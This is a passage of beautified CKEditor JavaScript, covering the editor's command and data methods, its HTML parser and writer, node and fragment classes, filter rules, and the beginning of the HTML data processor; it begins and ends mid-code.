                for (o in a) i = a[o], (n || i.contextSensitive) && i.refresh(e, t);
            }
        }
        function t() {
            var e = this.element;
            if (e && this.elementMode != CKEDITOR.ELEMENT_MODE_APPENDTO) {
                var t = this.getData();
                return this.config.htmlEncodeOutput && (t = CKEDITOR.tools.htmlEncode(t)), e.is("textarea") ? e.setValue(t) : e.setHtml(t),
                !0;
            }
            return !1;
        }
        e.prototype = CKEDITOR.editor.prototype, CKEDITOR.editor = e;
        var r = 0, s = {};
        CKEDITOR.tools.extend(CKEDITOR.editor.prototype, {
            addCommand: function(e, t) {
                t.name = e.toLowerCase();
                var n = new CKEDITOR.command(this, t);
                return this.mode && o(this, n), this.commands[e] = n;
            },
            _attachToForm: function() {
                function t(e) {
                    n.updateElement(), n._.required && !i.getValue() && !1 === n.fire("required") && e.data.preventDefault();
                }
                var n = this, i = n.element, e = new CKEDITOR.dom.element(i.$.form);
                i.is("textarea") && e && (e.on("submit", t), e.$.submit && e.$.submit.call && e.$.submit.apply && (e.$.submit = CKEDITOR.tools.override(e.$.submit, function(e) {
                    return function() {
                        t(), e.apply ? e.apply(this) : e();
                    };
                })), n.on("destroy", function() {
                    e.removeListener("submit", t);
                }));
            },
            destroy: function(e) {
                this.fire("beforeDestroy"), !e && t.call(this), this.editable(null), this.filter.destroy(),
                delete this.filter, delete this.activeFilter, this.status = "destroyed", this.fire("destroy"),
                this.removeAllListeners(), CKEDITOR.remove(this), CKEDITOR.fire("instanceDestroyed", null, this);
            },
            elementPath: function(e) {
                if (!e) {
                    if (!(e = this.getSelection())) return null;
                    e = e.getStartElement();
                }
                return e ? new CKEDITOR.dom.elementPath(e, this.editable()) : null;
            },
            createRange: function() {
                var e = this.editable();
                return e ? new CKEDITOR.dom.range(e) : null;
            },
            execCommand: function(e, t) {
                var n = this.getCommand(e), i = {
                    name: e,
                    commandData: t,
                    command: n
                };
                return !(!n || n.state == CKEDITOR.TRISTATE_DISABLED || !1 === this.fire("beforeCommandExec", i) || (i.returnValue = n.exec(i.commandData),
                n.async || !1 === this.fire("afterCommandExec", i))) && i.returnValue;
            },
            getCommand: function(e) {
                return this.commands[e];
            },
            getData: function(e) {
                !e && this.fire("beforeGetData");
                var t = this._.data;
                return "string" != typeof t && (t = (t = this.element) && this.elementMode == CKEDITOR.ELEMENT_MODE_REPLACE ? t.is("textarea") ? t.getValue() : t.getHtml() : ""),
                t = {
                    dataValue: t
                }, !e && this.fire("getData", t), t.dataValue;
            },
            getSnapshot: function() {
                var e = this.fire("getSnapshot");
                if ("string" != typeof e) {
                    var t = this.element;
                    t && this.elementMode == CKEDITOR.ELEMENT_MODE_REPLACE && (e = t.is("textarea") ? t.getValue() : t.getHtml());
                }
                return e;
            },
            loadSnapshot: function(e) {
                this.fire("loadSnapshot", e);
            },
            setData: function(e, t, n) {
                var i = !0, o = t;
                t && "object" == typeof t && (n = t.internal, o = t.callback, i = !t.noSnapshot),
                !n && i && this.fire("saveSnapshot"), !o && n || this.once("dataReady", function(e) {
                    !n && i && this.fire("saveSnapshot"), o && o.call(e.editor);
                }), e = {
                    dataValue: e
                }, !n && this.fire("setData", e), this._.data = e.dataValue, !n && this.fire("afterSetData", e);
            },
            setReadOnly: function(e) {
                e = null == e || e, this.readOnly != e && (this.readOnly = e, this.keystrokeHandler.blockedKeystrokes[8] = +e,
                this.editable().setReadOnly(e), this.fire("readOnly"));
            },
            insertHtml: function(e, t) {
                this.fire("insertHtml", {
                    dataValue: e,
                    mode: t
                });
            },
            insertText: function(e) {
                this.fire("insertText", e);
            },
            insertElement: function(e) {
                this.fire("insertElement", e);
            },
            focus: function() {
                this.fire("beforeFocus");
            },
            checkDirty: function() {
                return "ready" == this.status && this._.previousValue !== this.getSnapshot();
            },
            resetDirty: function() {
                this._.previousValue = this.getSnapshot();
            },
            updateElement: function() {
                return t.call(this);
            },
            setKeystroke: function() {
                for (var e, t, n = this.keystrokeHandler.keystrokes, i = CKEDITOR.tools.isArray(arguments[0]) ? arguments[0] : [ [].slice.call(arguments, 0) ], o = i.length; o--; ) e = i[o],
                t = 0, CKEDITOR.tools.isArray(e) && (t = e[1], e = e[0]), t ? n[e] = t : delete n[e];
            },
            addFeature: function(e) {
                return this.filter.addFeature(e);
            },
            setActiveFilter: function(e) {
                e || (e = this.filter), this.activeFilter !== e && (this.activeFilter = e, this.fire("activeFilterChange"),
                e === this.filter ? this.setActiveEnterMode(null, null) : this.setActiveEnterMode(e.getAllowedEnterMode(this.enterMode), e.getAllowedEnterMode(this.shiftEnterMode, !0)));
            },
            setActiveEnterMode: function(e, t) {
                e = e ? this.blockless ? CKEDITOR.ENTER_BR : e : this.enterMode, t = t ? this.blockless ? CKEDITOR.ENTER_BR : t : this.shiftEnterMode,
                this.activeEnterMode == e && this.activeShiftEnterMode == t || (this.activeEnterMode = e,
                this.activeShiftEnterMode = t, this.fire("activeEnterModeChange"));
            }
        });
    }(), CKEDITOR.ELEMENT_MODE_NONE = 0, CKEDITOR.ELEMENT_MODE_REPLACE = 1, CKEDITOR.ELEMENT_MODE_APPENDTO = 2,
    CKEDITOR.ELEMENT_MODE_INLINE = 3, CKEDITOR.htmlParser = function() {
        this._ = {
            htmlPartsRegex: /<(?:(?:\/([^>]+)>)|(?:!--([\S|\s]*?)--\>)|(?:([^\/\s>]+)((?:\s+[\w\-:.]+(?:\s*=\s*?(?:(?:"[^"]*")|(?:'[^']*')|[^\s"'\/>]+))?)*)[\S\s]*?(\/?)>))/g
        };
    }, O = /([\w\-:.]+)(?:(?:\s*=\s*(?:(?:"([^"]*)")|(?:'([^']*)')|([^\s>]+)))|(?=\s|$))/g,
    D = {
        checked: 1,
        compact: 1,
        declare: 1,
        defer: 1,
        disabled: 1,
        ismap: 1,
        multiple: 1,
        nohref: 1,
        noresize: 1,
        noshade: 1,
        nowrap: 1,
        readonly: 1,
        selected: 1
    }, CKEDITOR.htmlParser.prototype = {
        onTagOpen: function() {},
        onTagClose: function() {},
        onText: function() {},
        onCDATA: function() {},
        onComment: function() {},
        parse: function(e) {
            for (var t, n, i, o = 0; t = this._.htmlPartsRegex.exec(e); ) if ((n = t.index) > o && (o = e.substring(o, n),
            i ? i.push(o) : this.onText(o)), o = this._.htmlPartsRegex.lastIndex, !(n = t[1]) || (n = n.toLowerCase(),
            i && CKEDITOR.dtd.$cdata[n] && (this.onCDATA(i.join("")), i = null), i)) if (i) i.push(t[0]); else if (n = t[3]) {
                if (n = n.toLowerCase(), !/="/.test(n)) {
                    var a, r = {}, s = t[4];
                    if (t = !!t[5], s) for (;a = O.exec(s); ) {
                        var l = a[1].toLowerCase();
                        a = a[2] || a[3] || a[4] || "", r[l] = !a && D[l] ? l : CKEDITOR.tools.htmlDecodeAttr(a);
                    }
                    this.onTagOpen(n, r, t), !i && CKEDITOR.dtd.$cdata[n] && (i = []);
                }
            } else (n = t[2]) && this.onComment(n); else this.onTagClose(n);
            e.length > o && this.onText(e.substring(o, e.length));
        }
    }, CKEDITOR.htmlParser.basicWriter = CKEDITOR.tools.createClass({
        $: function() {
            this._ = {
                output: []
            };
        },
        proto: {
            openTag: function(e) {
                this._.output.push("<", e);
            },
            openTagClose: function(e, t) {
                t ? this._.output.push(" />") : this._.output.push(">");
            },
            attribute: function(e, t) {
                "string" == typeof t && (t = CKEDITOR.tools.htmlEncodeAttr(t)), this._.output.push(" ", e, '="', t, '"');
            },
            closeTag: function(e) {
                this._.output.push("</", e, ">");
            },
            text: function(e) {
                this._.output.push(e);
            },
            comment: function(e) {
                this._.output.push("\x3c!--", e, "--\x3e");
            },
            write: function(e) {
                this._.output.push(e);
            },
            reset: function() {
                this._.output = [], this._.indent = !1;
            },
            getHtml: function(e) {
                var t = this._.output.join("");
                return e && this.reset(), t;
            }
        }
    }), CKEDITOR.htmlParser.node = function() {}, CKEDITOR.htmlParser.node.prototype = {
        remove: function() {
            var e = this.parent.children, t = CKEDITOR.tools.indexOf(e, this), n = this.previous, i = this.next;
            n && (n.next = i), i && (i.previous = n), e.splice(t, 1), this.parent = null;
        },
        replaceWith: function(e) {
            var t = this.parent.children, n = CKEDITOR.tools.indexOf(t, this), i = e.previous = this.previous, o = e.next = this.next;
            i && (i.next = e), o && (o.previous = e), (t[n] = e).parent = this.parent, this.parent = null;
        },
        insertAfter: function(e) {
            var t = e.parent.children, n = CKEDITOR.tools.indexOf(t, e), i = e.next;
            t.splice(n + 1, 0, this), this.next = e.next, (this.previous = e).next = this, i && (i.previous = this),
            this.parent = e.parent;
        },
        insertBefore: function(e) {
            var t = e.parent.children, n = CKEDITOR.tools.indexOf(t, e);
            t.splice(n, 0, this), this.next = e, (this.previous = e.previous) && (e.previous.next = this),
            (e.previous = this).parent = e.parent;
        },
        getAscendant: function(t) {
            for (var e = "function" == typeof t ? t : "string" == typeof t ? function(e) {
                return e.name == t;
            } : function(e) {
                return e.name in t;
            }, n = this.parent; n && n.type == CKEDITOR.NODE_ELEMENT; ) {
                if (e(n)) return n;
                n = n.parent;
            }
            return null;
        },
        wrapWith: function(e) {
            return this.replaceWith(e), e.add(this), e;
        },
        getIndex: function() {
            return CKEDITOR.tools.indexOf(this.parent.children, this);
        },
        getFilterContext: function(e) {
            return e || {};
        }
    }, CKEDITOR.htmlParser.comment = function(e) {
        this.value = e, this._ = {
            isBlockLike: !1
        };
    }, CKEDITOR.htmlParser.comment.prototype = CKEDITOR.tools.extend(new CKEDITOR.htmlParser.node(), {
        type: CKEDITOR.NODE_COMMENT,
        filter: function(e, t) {
            var n = this.value;
            return (n = e.onComment(t, n, this)) ? "string" != typeof n ? (this.replaceWith(n),
            !1) : (this.value = n, !0) : (this.remove(), !1);
        },
        writeHtml: function(e, t) {
            t && this.filter(t), e.comment(this.value);
        }
    }), CKEDITOR.htmlParser.text = function(e) {
        this.value = e, this._ = {
            isBlockLike: !1
        };
    }, CKEDITOR.htmlParser.text.prototype = CKEDITOR.tools.extend(new CKEDITOR.htmlParser.node(), {
        type: CKEDITOR.NODE_TEXT,
        filter: function(e, t) {
            if (!(this.value = e.onText(t, this.value, this))) return this.remove(), !1;
        },
        writeHtml: function(e, t) {
            t && this.filter(t), e.text(this.value);
        }
    }), CKEDITOR.htmlParser.cdata = function(e) {
        this.value = e;
    }, CKEDITOR.htmlParser.cdata.prototype = CKEDITOR.tools.extend(new CKEDITOR.htmlParser.node(), {
        type: CKEDITOR.NODE_TEXT,
        filter: function() {},
        writeHtml: function(e) {
            e.write(this.value);
        }
    }), CKEDITOR.htmlParser.fragment = function() {
        this.children = [], this.parent = null, this._ = {
            isBlockLike: !0,
            hasInlineStarted: !1
        };
    }, function() {
        function T(e) {
            return !e.attributes["data-cke-survive"] && ("a" == e.name && e.attributes.href || CKEDITOR.dtd.$removeEmpty[e.name]);
        }
        var C = CKEDITOR.tools.extend({
            table: 1,
            ul: 1,
            ol: 1,
            dl: 1
        }, CKEDITOR.dtd.table, CKEDITOR.dtd.ul, CKEDITOR.dtd.ol, CKEDITOR.dtd.dl), I = {
            ol: 1,
            ul: 1
        }, O = CKEDITOR.tools.extend({}, {
            html: 1
        }, CKEDITOR.dtd.html, CKEDITOR.dtd.body, CKEDITOR.dtd.head, {
            style: 1,
            script: 1
        }), i = {
            ul: "li",
            ol: "li",
            dl: "dd",
            table: "tbody",
            tbody: "tr",
            thead: "tr",
            tfoot: "tr",
            tr: "td"
        };
        CKEDITOR.htmlParser.fragment.fromHtml = function(e, t, r) {
            function o(e) {
                var t;
                if (0 < f.length) for (var n = 0; n < f.length; n++) {
                    var i = f[n], o = i.name, a = CKEDITOR.dtd[o], r = g.name && CKEDITOR.dtd[g.name];
                    r && !r[o] || e && a && !a[e] && CKEDITOR.dtd[e] ? o == g.name && (l(g, g.parent, 1),
                    n--) : (t || (s(), t = 1), (i = i.clone()).parent = g, g = i, f.splice(n, 1), n--);
                }
            }
            function s() {
                for (;m.length; ) l(m.shift(), g);
            }
            function a(e) {
                if (e._.isBlockLike && "pre" != e.name && "textarea" != e.name) {
                    var t, n = e.children.length, i = e.children[n - 1];
                    i && i.type == CKEDITOR.NODE_TEXT && ((t = CKEDITOR.tools.rtrim(i.value)) ? i.value = t : e.children.length = n - 1);
                }
            }
            function l(e, t, n) {
                t = t || g || h;
                var i = g;
                void 0 === e.previous && (c(t, e) && (g = t, u.onTagOpen(r, {}), e.returnPoint = t = g),
                a(e), (!T(e) || e.children.length) && t.add(e), "pre" == e.name && (p = !1), "textarea" == e.name && (E = !1)),
                e.returnPoint ? (g = e.returnPoint, delete e.returnPoint) : g = n ? t : i;
            }
            function c(e, t) {
                var n, i;
                if ((e == h || "body" == e.name) && r && (!e.name || CKEDITOR.dtd[e.name][r])) return (n = t.attributes && (i = t.attributes["data-cke-real-element-type"]) ? i : t.name) && n in CKEDITOR.dtd.$inline && !(n in CKEDITOR.dtd.head) && !t.isOrphan || t.type == CKEDITOR.NODE_TEXT;
            }
            function d(e, t) {
                return (e in CKEDITOR.dtd.$listItem || e in CKEDITOR.dtd.$tableContent) && (e == t || "dt" == e && "dd" == t || "dd" == e && "dt" == t);
            }
            var u = new CKEDITOR.htmlParser(), h = t instanceof CKEDITOR.htmlParser.element ? t : "string" == typeof t ? new CKEDITOR.htmlParser.element(t) : new CKEDITOR.htmlParser.fragment(), f = [], m = [], g = h, E = "textarea" == h.name, p = "pre" == h.name;
            for (u.onTagOpen = function(e, t, n, i) {
                if ((t = new CKEDITOR.htmlParser.element(e, t)).isUnknown && n && (t.isEmpty = !0),
                t.isOptionalClose = i, T(t)) f.push(t); else {
                    if ("pre" == e) p = !0; else {
                        if ("br" == e && p) return void g.add(new CKEDITOR.htmlParser.text("\n"));
                        "textarea" == e && (E = !0);
                    }
                    if ("br" == e) m.push(t); else {
                        for (;i = (n = g.name) ? CKEDITOR.dtd[n] || (g._.isBlockLike ? CKEDITOR.dtd.div : CKEDITOR.dtd.span) : O,
                        !(t.isUnknown || g.isUnknown || i[e]); ) if (g.isOptionalClose) u.onTagClose(n); else if (e in I && n in I) (n = (n = g.children)[n.length - 1]) && "li" == n.name || l(n = new CKEDITOR.htmlParser.element("li"), g),
                        !t.returnPoint && (t.returnPoint = g), g = n; else if (e in CKEDITOR.dtd.$listItem && !d(e, n)) u.onTagOpen("li" == e ? "ul" : "dl", {}, 0, 1); else if (n in C && !d(e, n)) !t.returnPoint && (t.returnPoint = g),
                        g = g.parent; else {
                            if (n in CKEDITOR.dtd.$inline && f.unshift(g), !g.parent) {
                                t.isOrphan = 1;
                                break;
                            }
                            l(g, g.parent, 1);
                        }
                        o(e), s(), t.parent = g, t.isEmpty ? l(t) : g = t;
                    }
                }
            }, u.onTagClose = function(e) {
                for (var t = f.length - 1; 0 <= t; t--) if (e == f[t].name) return void f.splice(t, 1);
                for (var n = [], i = [], o = g; o != h && o.name != e; ) o._.isBlockLike || i.unshift(o),
                n.push(o), o = o.returnPoint || o.parent;
                if (o != h) {
                    for (t = 0; t < n.length; t++) {
                        var a = n[t];
                        l(a, a.parent);
                    }
                    (g = o)._.isBlockLike && s(), l(o, o.parent), o == g && (g = g.parent), f = f.concat(i);
                }
                "body" == e && (r = !1);
            }, u.onText = function(e) {
                if (g._.hasInlineStarted && !m.length || p || E || 0 !== (e = CKEDITOR.tools.ltrim(e)).length) {
                    var t = g.name, n = t ? CKEDITOR.dtd[t] || (g._.isBlockLike ? CKEDITOR.dtd.div : CKEDITOR.dtd.span) : O;
                    !E && !n["#"] && t in C ? (u.onTagOpen(i[t] || ""), u.onText(e)) : (s(), o(), !p && !E && (e = e.replace(/[\t\r\n ]{2,}|[\t\r\n]/g, " ")),
                    e = new CKEDITOR.htmlParser.text(e), c(g, e) && this.onTagOpen(r, {}, 0, 1), g.add(e));
                }
            }, u.onCDATA = function(e) {
                g.add(new CKEDITOR.htmlParser.cdata(e));
            }, u.onComment = function(e) {
                s(), o(), g.add(new CKEDITOR.htmlParser.comment(e));
            }, u.parse(e), s(); g != h; ) l(g, g.parent, 1);
            return a(h), h;
        }, CKEDITOR.htmlParser.fragment.prototype = {
            type: CKEDITOR.NODE_DOCUMENT_FRAGMENT,
            add: function(e, t) {
                isNaN(t) && (t = this.children.length);
                var n = 0 < t ? this.children[t - 1] : null;
                if (n) {
                    if (e._.isBlockLike && n.type == CKEDITOR.NODE_TEXT && (n.value = CKEDITOR.tools.rtrim(n.value),
                    0 === n.value.length)) return this.children.pop(), void this.add(e);
                    n.next = e;
                }
                e.previous = n, (e.parent = this).children.splice(t, 0, e), this._.hasInlineStarted || (this._.hasInlineStarted = e.type == CKEDITOR.NODE_TEXT || e.type == CKEDITOR.NODE_ELEMENT && !e._.isBlockLike);
            },
            filter: function(e, t) {
                t = this.getFilterContext(t), e.onRoot(t, this), this.filterChildren(e, !1, t);
            },
            filterChildren: function(e, t, n) {
                if (this.childrenFilteredBy != e.id) for (n = this.getFilterContext(n), t && !this.parent && e.onRoot(n, this),
                this.childrenFilteredBy = e.id, t = 0; t < this.children.length; t++) !1 === this.children[t].filter(e, n) && t--;
            },
            writeHtml: function(e, t) {
                t && this.filter(t), this.writeChildrenHtml(e);
            },
            writeChildrenHtml: function(e, t, n) {
                var i = this.getFilterContext();
                for (n && !this.parent && t && t.onRoot(i, this), t && this.filterChildren(t, !1, i),
                t = 0, i = (n = this.children).length; t < i; t++) n[t].writeHtml(e);
            },
            forEach: function(e, t, n) {
                if (!(n || t && this.type != t)) var i = e(this);
                if (!1 !== i) {
                    n = this.children;
                    for (var o = 0; o < n.length; o++) (i = n[o]).type == CKEDITOR.NODE_ELEMENT ? i.forEach(e, t) : (!t || i.type == t) && e(i);
                }
            },
            getFilterContext: function(e) {
                return e || {};
            }
        };
    }(), function() {
        function r() {
            this.rules = [];
        }
        function i(e, t, n, i) {
            var o, a;
            for (o in t) (a = e[o]) || (a = e[o] = new r()), a.add(t[o], n, i);
        }
        CKEDITOR.htmlParser.filter = CKEDITOR.tools.createClass({
            $: function(e) {
                this.id = CKEDITOR.tools.getNextNumber(), this.elementNameRules = new r(), this.attributeNameRules = new r(),
                this.elementsRules = {}, this.attributesRules = {}, this.textRules = new r(), this.commentRules = new r(),
                this.rootRules = new r(), e && this.addRules(e, 10);
            },
            proto: {
                addRules: function(e, t) {
                    var n;
                    "number" == typeof t ? n = t : t && "priority" in t && (n = t.priority), "number" != typeof n && (n = 10),
                    "object" != typeof t && (t = {}), e.elementNames && this.elementNameRules.addMany(e.elementNames, n, t),
                    e.attributeNames && this.attributeNameRules.addMany(e.attributeNames, n, t), e.elements && i(this.elementsRules, e.elements, n, t),
                    e.attributes && i(this.attributesRules, e.attributes, n, t), e.text && this.textRules.add(e.text, n, t),
                    e.comment && this.commentRules.add(e.comment, n, t), e.root && this.rootRules.add(e.root, n, t);
                },
                applyTo: function(e) {
                    e.filter(this);
                },
                onElementName: function(e, t) {
                    return this.elementNameRules.execOnName(e, t);
                },
                onAttributeName: function(e, t) {
                    return this.attributeNameRules.execOnName(e, t);
                },
                onText: function(e, t, n) {
                    return this.textRules.exec(e, t, n);
                },
                onComment: function(e, t, n) {
                    return this.commentRules.exec(e, t, n);
                },
                onRoot: function(e, t) {
                    return this.rootRules.exec(e, t);
                },
                onElement: function(e, t) {
                    for (var n, i = [ this.elementsRules["^"], this.elementsRules[t.name], this.elementsRules.$ ], o = 0; o < 3; o++) if (n = i[o]) {
                        if (!1 === (n = n.exec(e, t, this))) return null;
                        if (n && n != t) return this.onNode(e, n);
                        if (t.parent && !t.name) break;
                    }
                    return t;
                },
                onNode: function(e, t) {
                    var n = t.type;
                    return n == CKEDITOR.NODE_ELEMENT ? this.onElement(e, t) : n == CKEDITOR.NODE_TEXT ? new CKEDITOR.htmlParser.text(this.onText(e, t.value)) : n == CKEDITOR.NODE_COMMENT ? new CKEDITOR.htmlParser.comment(this.onComment(e, t.value)) : null;
                },
                onAttribute: function(e, t, n, i) {
                    return (n = this.attributesRules[n]) ? n.exec(e, i, t, this) : i;
                }
            }
        }), (CKEDITOR.htmlParser.filterRulesGroup = r).prototype = {
            add: function(e, t, n) {
                this.rules.splice(this.findIndex(t), 0, {
                    value: e,
                    priority: t,
                    options: n
                });
            },
            addMany: function(e, t, n) {
                for (var i = [ this.findIndex(t), 0 ], o = 0, a = e.length; o < a; o++) i.push({
                    value: e[o],
                    priority: t,
                    options: n
                });
                this.rules.splice.apply(this.rules, i);
            },
            findIndex: function(e) {
                for (var t = this.rules, n = t.length - 1; 0 <= n && e < t[n].priority; ) n--;
                return n + 1;
            },
            exec: function(e, t) {
                var n, i, o, a, r = t instanceof CKEDITOR.htmlParser.node || t instanceof CKEDITOR.htmlParser.fragment, s = Array.prototype.slice.call(arguments, 1), l = this.rules, c = l.length;
                for (a = 0; a < c; a++) if (r && (n = t.type, i = t.name), o = l[a], !(e.nonEditable && !o.options.applyToAll || e.nestedEditable && o.options.excludeNestedEditable)) {
                    if (!1 === (o = o.value.apply(null, s)) || r && o && (o.name != i || o.type != n)) return o;
                    null != o && (s[0] = t = o);
                }
                return t;
            },
            execOnName: function(e, t) {
                for (var n, i = 0, o = this.rules, a = o.length; t && i < a; i++) n = o[i], !(e.nonEditable && !n.options.applyToAll || e.nestedEditable && n.options.excludeNestedEditable) && (t = t.replace(n.value[0], n.value[1]));
                return t;
            }
        };
    }(), function() {
        function n(e, t) {
            function s(e) {
                return e || CKEDITOR.env.needsNbspFiller ? new CKEDITOR.htmlParser.text(" ") : new CKEDITOR.htmlParser.element("br", {
                    "data-cke-bogus": 1
                });
            }
            function n(a, r) {
                return function(e) {
                    if (e.type != CKEDITOR.NODE_DOCUMENT_FRAGMENT) {
                        var t, n, i = [], o = d(e);
                        if (o) for (l(o, 1) && i.push(o); o; ) f(o) && (t = u(o)) && l(t) && ((n = u(t)) && !f(n) ? i.push(t) : (s(c).insertAfter(t),
                        t.remove())), o = o.previous;
                        for (o = 0; o < i.length; o++) i[o].remove();
                        (i = !a || !1 !== ("function" == typeof r ? r(e) : r)) && (i = !(!c && !CKEDITOR.env.needsBrFiller && e.type == CKEDITOR.NODE_DOCUMENT_FRAGMENT || !c && !CKEDITOR.env.needsBrFiller && (7 < document.documentMode || e.name in CKEDITOR.dtd.tr || e.name in CKEDITOR.dtd.$listItem) || (i = d(e)) && ("form" != e.name || "input" != i.name))),
                        i && e.add(s(a));
                    }
                };
            }
            function l(e, t) {
                if ((!c || CKEDITOR.env.needsBrFiller) && e.type == CKEDITOR.NODE_ELEMENT && "br" == e.name && !e.attributes["data-cke-eol"]) return !0;
                var n;
                if (e.type == CKEDITOR.NODE_TEXT && (n = e.value.match(E))) {
                    if (n.index && (new CKEDITOR.htmlParser.text(e.value.substring(0, n.index)).insertBefore(e),
                    e.value = n[0]), !CKEDITOR.env.needsBrFiller && c && (!t || e.parent.name in r)) return !0;
                    if (!c && ((n = e.previous) && "br" == n.name || !n || f(n))) return !0;
                }
                return !1;
            }
            var i, o, a = {
                elements: {}
            }, c = "html" == t, r = CKEDITOR.tools.extend({}, C);
            for (i in r) "#" in T[i] || delete r[i];
            for (i in r) a.elements[i] = n(c, e.config.fillEmptyBlocks);
            return a.root = n(c, !1), a.elements.br = (o = c, function(e) {
                if (e.parent.type != CKEDITOR.NODE_DOCUMENT_FRAGMENT) {
                    var t = e.attributes;
                    if ("data-cke-bogus" in t || "data-cke-eol" in t) delete t["data-cke-bogus"]; else {
                        for (t = e.next; t && h(t); ) t = t.next;
                        var n = u(e);
                        !t && f(e.parent) ? m(e.parent, s(o)) : f(t) && n && !f(n) && s(o).insertBefore(t);
                    }
                }
            }), a;
        }
        function s(e, t) {
            return e != CKEDITOR.ENTER_BR && !1 !== t && (e == CKEDITOR.ENTER_DIV ? "div" : "p");
        }
        function d(e) {
            for (e = e.children[e.children.length - 1]; e && h(e); ) e = e.previous;
            return e;
        }
        function u(e) {
            for (e = e.previous; e && h(e); ) e = e.previous;
            return e;
        }
        function h(e) {
            return e.type == CKEDITOR.NODE_TEXT && !CKEDITOR.tools.trim(e.value) || e.type == CKEDITOR.NODE_ELEMENT && e.attributes["data-cke-bookmark"];
        }
        function f(e) {
            return e && (e.type == CKEDITOR.NODE_ELEMENT && e.name in C || e.type == CKEDITOR.NODE_DOCUMENT_FRAGMENT);
        }
        function m(e, t) {
            var n = e.children[e.children.length - 1];
            e.children.push(t), t.parent = e, n && ((n.next = t).previous = n);
        }
        function e(e) {
            "false" != (e = e.attributes).contenteditable && (e["data-cke-editable"] = e.contenteditable ? "true" : 1),
            e.contenteditable = "false";
        }
        function t(e) {
            switch ((e = e.attributes)["data-cke-editable"]) {
              case "true":
                e.contenteditable = "true";
                break;

              case "1":
                delete e.contenteditable;
            }
        }
        function l(e, t) {
            return e.replace(t, function(e, t, n) {
                return 0 === e.indexOf("<textarea") && (e = t + c(n).replace(/</g, "&lt;").replace(/>/g, "&gt;") + "</textarea>"),
                "<cke:encoded>" + encodeURIComponent(e) + "</cke:encoded>";
            });
        }
        function c(e) {
            return e.replace(/<\!--\{cke_protected\}\{C\}([\s\S]+?)--\>/g, function(e, t) {
                return decodeURIComponent(t);
            });
        }
        function g(e, t) {
            var n = t._.dataStore;
            return e.replace(/<\!--\{cke_protected\}([\s\S]+?)--\>/g, function(e, t) {
                return decodeURIComponent(t);
            }).replace(/\{cke_protected_(\d+)\}/g, function(e, t) {
                return n && n[t] || "";
            });
        }
        CKEDITOR.htmlDataProcessor = function(r) {
            var e, t, i = this;
            this.editor = r, this.dataFilter = e = new CKEDITOR.htmlParser.filter(), this.htmlFilter = t = new CKEDITOR.htmlParser.filter(),
            this.writer = new CKEDITOR.htmlParser.basicWriter(), e.addRules(a), e.addRules(I, {
                applyToAll: !0
            }), e.addRules(n(r, "data"), {
                applyToAll: !0
            }), t.addRules(O), t.addRules(D, {
                applyToAll: !0
            }), t.addRules(n(r, "html"), {
                applyToAll: !0
            }), r.on("toHtml", function(e) {
                var t, n, i, o, a = (a = (a = (a = (a = l((n = a = l(a = function(e, o) {
                    for (var i = [], t = o.config.protectedSource, n = o._.dataStore || (o._.dataStore = {
                        id: 1
                    }), a = /<\!--\{cke_temp(comment)?\}(\d*?)--\>/g, r = (t = [ /<script[\s\S]*?<\/script>/gi, /<noscript[\s\S]*?<\/noscript>/gi, /<meta[\s\S]*?\/?>/gi ].concat(t),
                    e = e.replace(/<\!--[\s\S]*?--\>/g, function(e) {
                        return "\x3c!--{cke_tempcomment}" + (i.push(e) - 1) + "--\x3e";
                    }), 0); r < t.length; r++) e = e.replace(t[r], function(e) {
                        return e = e.replace(a, function(e, t, n) {
                            return i[n];
                        }), /cke_temp(comment)?/.test(e) ? e : "\x3c!--{cke_temp}" + (i.push(e) - 1) + "--\x3e";
                    });
                    return (e = (e = e.replace(a, function(e, t, n) {
                        return "\x3c!--" + p + (t ? "{C}" : "") + encodeURIComponent(i[n]).replace(/--/g, "%2D%2D") + "--\x3e";
                    })).replace(/<\w+(?:\s+(?:(?:[^\s=>]+\s*=\s*(?:[^'"\s>]+|'[^']*'|"[^"]*"))|[^\s=>]+))+\s*>/g, function(e) {
                        return e.replace(/<\!--\{cke_protected\}([^>]*)--\>/g, function(e, t) {
                            return n[n.id] = decodeURIComponent(t), "{cke_protected_" + n.id++ + "}";
                        });
                    })).replace(/<(title|iframe|textarea)([^>]*)>([\s\S]*?)<\/\1>/g, function(e, t, n, i) {
                        return "<" + t + n + ">" + g(c(i), o) + "</" + t + ">";
                    });
                }(a = (e = e.data).dataValue, r), y), a = n.replace(R, function(e, t, n) {
                    return "<" + t + n.replace(v, function(e, t) {
                        return b.test(t) && -1 == n.indexOf("data-cke-saved-" + t) ? " data-cke-saved-" + e + " data-cke-" + CKEDITOR.rnd + "-" + e : e;
                    }) + ">";
                })), K)).replace(k, "$1cke:$2")).replace(S, "<cke:$1$2></cke:$1>")).replace(/(<pre\b[^>]*>)(\r\n|\n)/g, "$1$2$2")).replace(/([^a-z0-9<\-])(on\w{3,})(?!>)/gi, "$1data-cke-" + CKEDITOR.rnd + "-$2");
                t = e.context || r.editable().getName(), CKEDITOR.env.ie && CKEDITOR.env.version < 9 && "pre" == t && (t = "div",
                a = "<pre>" + a + "</pre>", i = 1), (t = r.document.createElement(t)).setHtml("a" + a),
                a = (a = t.getHtml().substr(1)).replace(RegExp("data-cke-" + CKEDITOR.rnd + "-", "ig"), ""),
                i && (a = a.replace(/^<pre>|<\/pre>$/gi, "")), a = c((o = a = a.replace(N, "$1$2"),
                a = o.replace(_, function(e, t) {
                    return decodeURIComponent(t);
                }))), t = !1 !== e.fixForBody && s(e.enterMode, r.config.autoParagraph), a = CKEDITOR.htmlParser.fragment.fromHtml(a, e.context, t),
                t && !(i = a).children.length && CKEDITOR.dtd[i.name][t] && (t = new CKEDITOR.htmlParser.element(t),
                i.add(t)), e.dataValue = a;
            }, null, null, 5), r.on("toHtml", function(e) {
                e.data.filter.applyTo(e.data.dataValue, !0, e.data.dontFilter, e.data.enterMode) && r.fire("dataFiltered");
            }, null, null, 6), r.on("toHtml", function(e) {
                e.data.dataValue.filterChildren(i.dataFilter, !0);
            }, null, null, 10), r.on("toHtml", function(e) {
                var t = (e = e.data).dataValue, n = new CKEDITOR.htmlParser.basicWriter();
                t.writeChildrenHtml(n), t = n.getHtml(!0), e.dataValue = t.replace(/<\!--(?!{cke_protected})[\s\S]+?--\>/g, function(e) {
                    return "\x3c!--" + p + "{C}" + encodeURIComponent(e).replace(/--/g, "%2D%2D") + "--\x3e";
                });
            }, null, null, 15), r.on("toDataFormat", function(e) {
                var t = e.data.dataValue;
                e.data.enterMode != CKEDITOR.ENTER_BR && (t = t.replace(/^<br *\/?>/i, "")), e.data.dataValue = CKEDITOR.htmlParser.fragment.fromHtml(t, e.data.context, s(e.data.enterMode, r.config.autoParagraph));
